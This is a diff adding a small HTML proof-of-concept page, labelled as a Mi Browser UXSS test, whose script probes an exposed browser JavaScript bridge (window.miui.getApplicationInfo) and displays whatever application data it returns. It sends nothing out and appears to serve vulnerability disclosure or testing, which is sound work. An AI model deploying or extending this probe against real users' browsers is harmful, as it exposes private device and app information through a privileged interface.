@@ -1,0 +1,22 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Mi Browser UXSS — getApplicationInfo PoC</title>
+<pre id="out">Starting…</pre>
+<script>
+try {
+  if (typeof window.miui === "object" && typeof window.miui.getApplicationInfo === "function") {
+    var info;
+    try { info = window.miui.getApplicationInfo(); } catch(e) { info = "THREW:"+e; }
+    var s;
+    try { s = JSON.stringify(info); } catch(_) { s = String(info); }
+    document.getElementById('out').textContent = "getApplicationInfo() => " + s;
+    alert("MIUI-POC getApplicationInfo:\\n" + s);
+  } else {
+    document.getElementById('out').textContent = "getApplicationInfo not available";
+    alert("MIUI-POC: getApplicationInfo not available");
+  }
+} catch(e) {
+  document.getElementById('out').textContent = "ERROR: " + e;
+  alert("MIUI-POC ERR: " + e);
+}
+</script>
